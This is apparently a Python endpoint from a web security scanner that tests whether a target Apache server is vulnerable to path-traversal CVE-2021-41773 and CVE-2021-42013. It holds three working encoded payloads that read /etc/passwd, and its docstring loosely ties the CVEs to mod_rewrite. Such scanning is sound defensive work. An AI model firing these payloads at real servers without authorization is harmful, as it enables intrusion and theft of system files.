"""apache_modrewrite_confusion — Apache mod_rewrite trailing-newline + dotpath bypass.

Apache mod_rewrite combined with PHP-FPM has known parser-confusion
bugs (CVE-2021-41773, CVE-2021-42013). Path-normalization differences
between mod_rewrite + the backend let attacker reach files outside
intended scope.
"""
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_request, wrap_finding, standard_response)

router = APIRouter()
# Apache 2.4.49 / 2.4.50 path-traversal
APACHE_CVE_PAYLOADS = [
    "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",  # CVE-2021-41773
    "/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",  # CVE-2021-42013
    "/icons/.%2e/.%2e/.%2e/etc/passwd",
]


@router.post("/api/webapp/scan/apache_modrewrite_confusion")
def scan_apache_modrewrite_confusion(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target).rstrip("/")
    # Quick server detect
    r0 = safe_request("GET", base + "/",
        headers={"User-Agent": "VulnusLab/1.0"},
        req=req, timeout=6, allow_redirects=False)
    if r0 is None:
        return standard_response(
            tool="apache_modrewrite_confusion", target=req.target, findings=[],
            tests_performed=1, vulnerable=False,
            skipped_reason="no baseline response")
    server = (r0.headers.get("server") or "").lower()
    is_apache = "apache" in server

    hits = []
    for p in APACHE_CVE_PAYLOADS:
        r = safe_request("GET", base + p,
            headers={"User-Agent": "VulnusLab/1.0"},
            req=req, timeout=8, allow_redirects=False)
        if r is None: continue
        body = (r.text or "")[:5000]
        if "root:x:" in body or "root:!" in body or "/bin/bash" in body:
            hits.append({"payload": p, "marker": "root: in body"})
    findings = []
    if hits:
        findings.append(wrap_finding(
            f"Apache mod_rewrite CVE-2021-41773 / 42013 exploitable ({len(hits)} variants)",
            "CRITICAL", cvss="9.8", cwe="CWE-22", owasp="A01:2021",
            remediation="UPGRADE Apache to ≥ 2.4.51 immediately. These CVEs are "
                        "wormed and currently used for mass exploitation of "
                        "exposed Apache servers.",
            evidence_marker=" | ".join(f"{h['payload']} → {h['marker']}" for h in hits[:3])))
    elif is_apache:
        findings.append(wrap_finding(
            "Apache detected, CVE-2021-41773/42013 not exploitable",
            "POSITIVE", cwe="CWE-22",
            remediation="Maintain. Apply patches when new mod_rewrite CVEs publish.",
            evidence_marker=f"server: {server[:60]}, payloads rejected"))
    else:
        findings.append(wrap_finding(
            "Not Apache — mod_rewrite CVE not applicable", "POSITIVE",
            cwe="CWE-22", remediation="N/A",
            evidence_marker=f"server: {server[:60]}"))
    return standard_response(
        tool="apache_modrewrite_confusion", target=req.target, findings=findings,
        tests_performed=1 + len(APACHE_CVE_PAYLOADS),
        vulnerable=bool(hits),
        tests_summary=f"apache: {is_apache}, hits: {len(hits)}",
        raw_data={"server": server, "hits": hits})


def register(app):
    app.include_router(router)
